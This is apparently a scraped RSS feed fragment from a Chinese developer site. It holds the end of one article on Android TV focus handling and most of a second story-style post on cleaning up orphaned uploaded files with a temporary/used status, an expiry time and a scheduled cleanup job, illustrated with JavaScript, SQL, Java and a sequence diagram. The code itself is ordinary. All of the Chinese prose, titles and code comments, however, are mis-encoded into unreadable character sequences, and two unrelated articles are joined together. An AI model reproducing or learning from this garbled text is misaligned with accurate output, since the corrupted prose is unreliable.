<p>è¿™é‡Œï¼Œæˆ‘ä»¬æ€»ç»“äº†äº‹ä»¶å’Œç„¦ç‚¹çš„åˆ†å‘ä¼ é€’ï¼Œä¹Ÿæ€»ç»“äº†å¸¸è§çš„é—®é¢˜ï¼Œå¯¹äºæœªå±•ç¤ºViewèšç„¦è¿™éƒ¨åˆ†ï¼Œç›®å‰åº”è¯¥è¿˜æœ‰æ›´å¥½çš„æ–¹æ¡ˆï¼Œæˆ‘ä»¬æœŸå¾…çš„æ˜¯ï¼Œå¸Œæœ›èƒ½ç›‘å¬å¸ƒå±€å®Œæˆä¹‹åå®ç°ç„¦ç‚¹ï¼Œä½†ç›®å‰ä»RecyclerViewæºç æ¥çœ‹ï¼Œéš¾åº¦å…¶å®å¾ˆå¤§ã€‚ä¸è¿‡ï¼Œæ€»ä½“è€Œè¨€postæ–¹å¼ä¹Ÿå¹¶éä¸å¥½ã€‚æˆ‘ä»¬ä¹Ÿä¼šä¸€ç›´ç ”ç©¶è·Ÿè¿›ï¼Œè™½ç„¶ç›®å‰å¤Ÿç”¨ï¼Œåç»­å¦‚æœæ¢ç´¢åˆ°æ–°çš„æ–¹æ¡ˆï¼Œä¹Ÿä¼šæ›´æ–°å¤„ç†ã€‚</p>
<h2 data-id="heading-13">æ€»ç»“</h2>
<p>æœ¬ç¯‡å°±åˆ°è¿™é‡Œã€‚</p>
<p>ä»¥ä¸Šæ˜¯æœ¬ç¯‡æ‰€æœ‰å†…å®¹ï¼Œæœ¬ç¯‡ä¸»è¦è®¨è®ºçš„TVç„¦ç‚¹çš„ä¸€äº›äº‹æƒ…ï¼Œç‰¹åˆ«æ˜¯ç„¦ç‚¹çš„åˆ†å‘ã€æ‹¦æˆªï¼Œä»¥åŠRecyclerViewä¸€ç³»åˆ—ç„¦ç‚¹é—®é¢˜å’Œè§£å†³æ–¹æ³•ï¼Œå¸Œæœ›å¯¹ä½ æœ‰æ‰€å¸®åŠ©ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¥¹é—®æˆ‘ï¼šæœåŠ¡å™¨å¿«è¢«åƒåœ¾æ–‡ä»¶å¡çˆ†äº†ï¼Œæ€ä¹ˆç ´ï¼Ÿæˆ‘è¯´ï¼šç»™æ–‡ä»¶åŠä¸ªâ€œä¸´æ—¶å±…ä½è¯â€]]></title>    <link>https://juejin.cn/post/7592610104441126922</link>    <guid>https://juejin.cn/post/7592610104441126922</guid>    <pubDate>2026-01-08T03:51:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592610104441126922" data-draft-id="7592816646854311986" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¥¹é—®æˆ‘ï¼šæœåŠ¡å™¨å¿«è¢«åƒåœ¾æ–‡ä»¶å¡çˆ†äº†ï¼Œæ€ä¹ˆç ´ï¼Ÿæˆ‘è¯´ï¼šç»™æ–‡ä»¶åŠä¸ªâ€œä¸´æ—¶å±…ä½è¯â€"/> <meta itemprop="keywords" content="åç«¯,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-08T03:51:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ´›å°è±†"/> <meta itemprop="url" content="https://juejin.cn/user/2049145406229127"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¥¹é—®æˆ‘ï¼šæœåŠ¡å™¨å¿«è¢«åƒåœ¾æ–‡ä»¶å¡çˆ†äº†ï¼Œæ€ä¹ˆç ´ï¼Ÿæˆ‘è¯´ï¼šç»™æ–‡ä»¶åŠä¸ªâ€œä¸´æ—¶å±…ä½è¯â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2049145406229127/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ´›å°è±†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:51:03.000Z" title="Thu Jan 08 2026 03:51:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="an-old-hope">.hljs-comment,.hljs-quote{color:#b6b18b}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#eb3c54}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#e7ce56}.hljs-attribute{color:#ee7c2b}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#4fb4d7}.hljs-section,.hljs-title{color:#78bb65}.hljs-keyword,.hljs-selector-tag{color:#b45ea4}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1d21;color:#c0c5ce}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ”¥ å¼€ç¯‡</h2>
<p>å‘¨äº”çš„å‚æ™šï¼Œçª—å¤–çš„æ™šéœçƒ§å¾—æ­£æ—ºï¼Œä½†æˆ‘æ²¡å¿ƒæ€æ¬£èµã€‚å› ä¸ºè¿ç»´èƒ–å“¥åˆšåˆšåœ¨ç¾¤é‡Œå‘äº†ä¸€å¼ æœåŠ¡å™¨ç£ç›˜æŠ¥è­¦çš„æˆªå›¾ï¼Œé‚£é²œçº¢çš„ <strong>92%</strong> çœ‹å¾—æˆ‘å¿ƒæƒŠè‚‰è·³ã€‚</p>
<p>â€œè±†å­ï¼â€èƒ–å“¥ç›´æ¥æ€åˆ°äº†æˆ‘å·¥ä½ï¼Œâ€œä½ ä»¬é‚£ä¸ªâ€˜ç”¨æˆ·åé¦ˆâ€™åŠŸèƒ½æ˜¯ä¸æ˜¯æœ‰æ¯’ï¼Ÿæˆ‘çœ‹ OSS å­˜å‚¨æ¡¶é‡Œçš„æ–‡ä»¶æ•°é‡è¿™å‘¨æ¿€å¢äº† 50%ï¼Œä½†æ•°æ®åº“é‡Œçš„åé¦ˆè®°å½•æ ¹æœ¬æ²¡å‡ æ¡å•Šï¼â€</p>
<p>æ­£è¯´ç€ï¼Œå°æ±ç«¯ç€å¥¶èŒ¶å‡‘äº†è¿‡æ¥ï¼Œä¸€è„¸æ— è¾œåˆå¸¦ç€ç‚¹å¿ƒè™šï¼šâ€œé‚£ä¸ªâ€¦â€¦æˆ‘ä¹Ÿå‘ç°äº†ã€‚å¾ˆå¤šç”¨æˆ·ä¸Šä¼ äº†æˆªå›¾ï¼Œç»“æœæ²¡ç‚¹â€˜æäº¤â€™å°±å…³é¡µé¢è·‘è·¯äº†ã€‚é‚£äº›å›¾ç‰‡å°±æˆäº†æ²¡äººè¦çš„å­¤å„¿ï¼Œä¸€ç›´èµ–åœ¨æœåŠ¡å™¨ä¸Šã€‚â€</p>
<p>â€œå¥½å®¶ä¼™ï¼Œâ€æˆ‘æ‰¶é¢ï¼Œâ€œåˆç€æˆ‘ä»¬æ˜¯åœ¨åšâ€˜ç½‘ç»œåƒåœ¾å›æ”¶ç«™â€™å•Šã€‚â€</p>
<p>è¿™å…¶å®æ˜¯ä¸€ä¸ªéå¸¸ç»å…¸çš„å·¥ç¨‹é—®é¢˜ï¼š<strong>å¼‚æ­¥çš„æ–‡ä»¶ä¸Šä¼ </strong>ä¸<strong>åŸå­çš„ä¸šåŠ¡æäº¤</strong>ä¸ä¸€è‡´ï¼Œå¯¼è‡´äº†â€œ<strong>å­¤å„¿èµ„æºï¼ˆOrphan Fileï¼‰</strong>â€ã€‚</p>
<h2 data-id="heading-1">ğŸ¯ åœºæ™¯è¿˜åŸ</h2>
<p>å°æ±æ‰“å¼€äº†å¥¹çš„ä»£ç ï¼ŒæŒ‡ç€é‚£ä¸ªä¸Šä¼ ç»„ä»¶ï¼š</p>
<p>â€œç°åœ¨çš„é€»è¾‘æ˜¯è¿™æ ·çš„ï¼šâ€</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. ç”¨æˆ·é€‰å›¾ï¼Œç«‹å³ä¸Šä¼ </span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">onUpload</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">file</span>) =&gt; {
  <span class="hljs-keyword">const</span> url = <span class="hljs-keyword">await</span> <span class="hljs-title function_">uploadAPI</span>(file); <span class="hljs-comment">// æ–‡ä»¶ç›´æ¥è½ç›˜</span>
  form.<span class="hljs-property">imageUrl</span> = url;               <span class="hljs-comment">// æ‹¿åˆ° URL å¡«å…¥è¡¨å•</span>
};

<span class="hljs-comment">// 2. ç”¨æˆ·å¯èƒ½... æ°¸è¿œä¸ç‚¹å‡»æäº¤</span>
<span class="hljs-comment">// const onSubmit = async () =&gt; { ... } </span>
</code></pre>
<p>â€œåªè¦ç”¨æˆ·ä¸Šä¼ äº†å›¾ç‰‡ï¼Œâ€å°æ±å¹äº†æ°”ï¼Œâ€œä¸ç®¡ä»–æœ€åæä¸æäº¤è¡¨å•ï¼Œè¿™æ–‡ä»¶éƒ½å·²ç»å­˜ä¸‹æ¥äº†ã€‚ç°åœ¨çš„æœåŠ¡å™¨é‡Œï¼Œä¼°è®¡æœ‰ä¸€åŠéƒ½æ˜¯è¿™ç§â€˜å¹½çµæ–‡ä»¶â€™ã€‚â€</p>
<p>â€œå¦‚æœæ˜¯å°æ–‡ä»¶ï¼Œâ€å°æ±çªç„¶çœ¼ç›ä¸€äº®ï¼Œâ€œå…¶å®æˆ‘æœ‰æ‹›ï¼æˆ‘ä»¬èƒ½ä¸èƒ½åˆ«è¿™ä¹ˆæ€¥ç€ä¸Šä¼ ï¼Ÿâ€</p>
<p>å¥¹å¿«é€Ÿæ•²äº†å‡ è¡Œä»£ç ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ–¹æ¡ˆä¸€ï¼šæ··åˆæäº¤ï¼ˆFormDataï¼‰</span>
<span class="hljs-keyword">async</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">data, imageFile</span>) {
  <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>()
  <span class="hljs-comment">// æŠŠ JSON æ•°æ®è½¬æˆ Blob å¡è¿›å»</span>
  formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'data'</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Blob</span>([<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data)], { <span class="hljs-attr">type</span>: <span class="hljs-string">'application/json'</span> }))
  
  <span class="hljs-keyword">if</span> (imageFile) {
    <span class="hljs-comment">// å‰ç«¯å…ˆå‹ç¼©ï¼Œéšè¡¨å•ä¸€èµ·æäº¤</span>
    <span class="hljs-keyword">const</span> webpFile = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convertImageToWebp</span>(imageFile, <span class="hljs-number">0.8</span>)
    formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'imageFile'</span>, webpFile)
  }
  
  <span class="hljs-comment">// ä¸€æ¬¡è¯·æ±‚ï¼Œæå®šæ‰€æœ‰</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">request</span>({ <span class="hljs-attr">url</span>: <span class="hljs-string">'/reward'</span>, <span class="hljs-attr">method</span>: <span class="hljs-string">'post'</span>, <span class="hljs-attr">data</span>: formData })
}
</code></pre>
<p>â€œä½ çœ‹ï¼Œâ€å°æ±å¾—æ„åœ°è¯´ï¼Œâ€œè¿™æ ·æ–‡ä»¶å’Œè¡¨å•æ˜¯<strong>åŸå­æ€§</strong>çš„ã€‚è¦ä¹ˆéƒ½æˆåŠŸï¼Œè¦ä¹ˆéƒ½å¤±è´¥ï¼Œæ ¹æœ¬ä¸ä¼šæœ‰å­¤å„¿æ–‡ä»¶ï¼â€</p>
<h2 data-id="heading-2">ğŸ§  æ€è·¯åˆ†æ</h2>
<p>â€œå°æ±è¿™æ‹›â€˜æ··åˆæäº¤â€™ï¼Œå¯¹ä»˜å°å¤´åƒã€å°æˆªå›¾ç¡®å®å¤Ÿç”¨ã€‚â€</p>
<p>é˜¿è¾°ä¸çŸ¥ä½•æ—¶ç«™åœ¨äº†æˆ‘ä»¬èº«åï¼Œæ‰‹é‡Œä¾æ—§æ˜¯é‚£ä¸ªä¿æ¸©æ¯ã€‚ä»–çœ‹äº†ä¸€çœ¼ä»£ç ï¼Œæ·¡æ·¡åœ°è¯´ï¼šâ€œä½†å¦‚æœç”¨æˆ·è¦ä¸Šä¼ ä¸€ä¸ª 500MB çš„è§†é¢‘å‘¢ï¼Ÿæˆ–è€…å¼±ç½‘ç¯å¢ƒä¸‹ä¸Šä¼  10 å¼ é«˜æ¸…å›¾å‘¢ï¼Ÿä½ è®©ç”¨æˆ·ç‚¹æäº¤æŒ‰é’®åå¹²ç­‰å‡ åç§’ï¼Ÿä½“éªŒä¼šå´©çš„ã€‚â€</p>
<p>å°æ±æ„£äº†ä¸€ä¸‹ï¼Œé»˜é»˜æ”¶å›äº†å¾—æ„çš„ç¬‘å®¹ã€‚</p>
<p>é˜¿è¾°æ‹‰è¿‡ç™½æ¿ï¼Œç”»äº†ä¸¤ä¸ªåœˆï¼š</p>
<p>â€œå¯¹äºå¤§æ–‡ä»¶æˆ–é€šç”¨åœºæ™¯ï¼Œæˆ‘ä»¬è¿˜æ˜¯å¾—èµ°å¼‚æ­¥ä¸Šä¼ ã€‚ä½†å…³é”®åœ¨äºâ€”â€”<strong>â€˜ä¸Šä¼  â‰  ç”Ÿæ•ˆâ€™</strong>ã€‚â€</p>
<p>ä»–å†™ä¸‹äº†ä¸€ä¸ªè¯ï¼š<strong>ä¸¤é˜¶æ®µæäº¤</strong>ã€‚</p>
<p>â€œæˆ‘ä»¬ç»™æ–‡ä»¶è®¾è®¡ä¸ªç”Ÿå‘½å‘¨æœŸï¼Œå°±åƒ<strong>åŠç­¾è¯</strong>ä¸€æ ·ï¼šâ€</p>
<ol>
<li><strong>ä¸´æ—¶æ€ (TEMP)</strong>ï¼šåˆšä¸Šä¼ çš„æ–‡ä»¶ï¼Œé»˜è®¤éƒ½æ˜¯â€œä¸´æ—¶è®¿å®¢â€ã€‚ç»™å®ƒå‘ä¸ªæœ‰æ•ˆæœŸ 24 å°æ—¶çš„â€œä¸´æ—¶å±…ä½è¯â€ã€‚</li>
<li><strong>è½¬æ­£ (USED)</strong>ï¼šåªæœ‰å½“è¡¨å•æäº¤æˆåŠŸäº†ï¼Œåç«¯æ‰ä¼šåœ¨äº‹åŠ¡é‡Œç»™è¿™ä¸ªæ–‡ä»¶ç›–ä¸ªç« ï¼Œå˜æˆâ€œæ°¸ä¹…å±…æ°‘â€ã€‚</li>
<li><strong>é©±é€</strong>ï¼šè¿‡æœŸè¿˜æ²¡è½¬æ­£çš„ï¼Œç›´æ¥ç”±å®šæ—¶ä»»åŠ¡æ¸…ç†æ‰ã€‚</li>
</ol>
<h2 data-id="heading-3">ğŸ’» ä»£ç å®æˆ˜</h2>
<p>è¯´å¹²å°±å¹²ã€‚æˆ‘ä»¬å†³å®šé‡‡ç”¨ <strong>æ–¹æ¡ˆäºŒï¼ˆä¸¤é˜¶æ®µæäº¤ï¼‰</strong> ä½œä¸ºä¸»æ–¹æ¡ˆï¼Œå°æ±çš„ <strong>æ–¹æ¡ˆä¸€ï¼ˆæ··åˆæäº¤ï¼‰</strong> ä½œä¸ºè½»é‡çº§åœºæ™¯çš„å¤‡é€‰ã€‚</p>
<h3 data-id="heading-4">1. æ•°æ®åº“å±‚æ”¹é€ ï¼šç»™æ–‡ä»¶åŠ ä¸ªèº«ä»½</h3>
<p>æˆ‘ä»¬éœ€è¦ä¸€å¼ ç»Ÿä¸€çš„ <code>sys_file</code> è¡¨æ¥ç®¡ç†æ‰€æœ‰æ–‡ä»¶ã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `sys_file` (
  `id` <span class="hljs-type">bigint</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  `url` <span class="hljs-type">varchar</span>(<span class="hljs-number">500</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  `status` tinyint <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">0</span>, <span class="hljs-comment">-- 0: TEMP(ä¸´æ—¶), 1: USED(å·²ç¡®è®¤)</span>
  `expire_time` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>, <span class="hljs-comment">-- ä¸´æ—¶æ–‡ä»¶è¿‡æœŸæ—¶é—´</span>
  `create_time` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>
);
</code></pre>
<h3 data-id="heading-5">2. åç«¯é€»è¾‘ï¼šä¸Šä¼ å³â€œä¸´æ—¶â€</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸Šä¼ æ¥å£</span>
<span class="hljs-keyword">public</span> FileVO <span class="hljs-title function_">upload</span><span class="hljs-params">(MultipartFile file)</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> ossService.upload(file);
    
    <span class="hljs-type">SysFile</span> <span class="hljs-variable">sysFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SysFile</span>();
    sysFile.setUrl(url);
    sysFile.setStatus(Status.TEMP); <span class="hljs-comment">// é»˜è®¤æ˜¯ä¸´æ—¶æ€</span>
    sysFile.setExpireTime(LocalDateTime.now().plusHours(<span class="hljs-number">24</span>)); <span class="hljs-comment">// 24å°æ—¶åè¿‡æœŸ</span>
    
    fileMapper.insert(sysFile);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileVO</span>(sysFile.getId(), url);
}
</code></pre>
<h3 data-id="heading-6">3. ä¸šåŠ¡æäº¤ï¼šäº‹åŠ¡å†…â€œè½¬æ­£â€</h3>
<p>è¿™æ˜¯æœ€å…³é”®çš„ä¸€æ­¥ã€‚åªæœ‰ä¸šåŠ¡æˆåŠŸäº†ï¼Œæ–‡ä»¶æ‰èƒ½æ´»ä¸‹æ¥ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">submitFeedback</span><span class="hljs-params">(FeedbackForm form)</span> {
    <span class="hljs-comment">// 1. ä¿å­˜ä¸šåŠ¡æ•°æ®</span>
    feedbackMapper.save(form);
    
    <span class="hljs-comment">// 2. ã€å…³é”®ã€‘å°†æ–‡ä»¶æ ‡è®°ä¸ºâ€œå·²ä½¿ç”¨â€</span>
    <span class="hljs-comment">// è¿™ä¸€æ­¥å¿…é¡»åœ¨äº‹åŠ¡å†…ï¼Œå¦‚æœä¿å­˜å¤±è´¥å›æ»šï¼Œæ–‡ä»¶ä¾ç„¶æ˜¯ TEMPï¼Œä¼šè¢«åç»­æ¸…ç†</span>
    <span class="hljs-keyword">if</span> (form.getFileId() != <span class="hljs-literal">null</span>) {
        fileMapper.updateStatus(form.getFileId(), Status.USED);
    }
}
</code></pre>
<h3 data-id="heading-7">4. æµç¨‹å›¾è§£</h3>
<p>ä¸ºäº†è®©é€»è¾‘æ›´æ¸…æ™°ï¼Œæˆ‘ç”»äº†ä¸ªå›¾ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant User as ç”¨æˆ·
    participant API as åç«¯API
    participant DB as æ•°æ®åº“
    participant Job as å®šæ—¶ä»»åŠ¡

    User-&gt;&gt;API: 1. ä¸Šä¼ æ–‡ä»¶
    API-&gt;&gt;DB: å­˜å…¥è®°å½• (çŠ¶æ€=TEMP, è¿‡æœŸ=24hå)
    API--&gt;&gt;User: è¿”å› fileId

    alt ç”¨æˆ·æäº¤è¡¨å•
        User-&gt;&gt;API: 2. æäº¤è¡¨å• (å¸¦ fileId)
        API-&gt;&gt;DB: å¼€å¯äº‹åŠ¡
        API-&gt;&gt;DB: ä¿å­˜ä¸šåŠ¡æ•°æ®
        API-&gt;&gt;DB: æ›´æ–°æ–‡ä»¶çŠ¶æ€ TEMP -&gt; USED
        API--&gt;&gt;User: æäº¤æˆåŠŸ
    else ç”¨æˆ·è·‘è·¯
        Note right of User: ä»€ä¹ˆéƒ½ä¸åš
    end

    loop æ¯å°æ—¶æ‰§è¡Œ
        Job-&gt;&gt;DB: æ‰«æ status=TEMP &amp; expire_time &lt; now
        Job-&gt;&gt;API: åˆ é™¤ç‰©ç†æ–‡ä»¶
        Job-&gt;&gt;DB: åˆ é™¤æ–‡ä»¶è®°å½•
    end
</code></pre>
<h2 data-id="heading-8">ğŸ“Š æ•ˆæœéªŒè¯</h2>
<p>ä¸Šçº¿ä¸€å‘¨åã€‚</p>
<p>èƒ–å“¥å†æ¬¡ä¸¢è¿‡æ¥ä¸€å¼ æˆªå›¾ï¼Œè¿™æ¬¡æ˜¯å­˜å‚¨æ¡¶çš„å¢é•¿æ›²çº¿ã€‚</p>
